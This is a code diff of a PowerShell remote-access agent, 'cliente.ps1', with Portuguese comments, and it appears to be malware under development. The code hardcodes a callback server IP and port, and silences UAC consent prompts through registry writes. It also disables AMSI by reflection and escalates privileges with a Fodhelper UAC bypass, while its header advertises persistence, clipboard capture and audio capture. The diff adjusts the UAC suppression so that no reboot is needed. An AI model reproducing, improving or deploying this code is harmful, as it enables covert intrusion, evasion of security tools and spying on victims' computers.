@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent Completo: Auto-Elevação Invisível + UAC Desativado + Persistencia + Clipboard + Audio
+# Agent Completo: Sem pedir reboot, UAC silenciado, Persistencia, Clipboard, Audio
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -25,9 +25,9 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # 1. Desativar UAC (Não reinicia o explorer, apenas grava no registro)
+    # 1. Silenciar o UAC SEM REINICIAR O PC
     try {
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+        # Apenas remove o prompt de consentimento (não altera o EnableLUA)
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
     } catch {}
@@ -128,7 +128,7 @@ while (`$true) {
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
-# AUTO-ELEVAÇÃO SEM REINICIAR (Bypass Fodhelper)
+# AUTO-ELEVAÇÃO SILENCIOSA (Fodhelper Bypass)
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try {
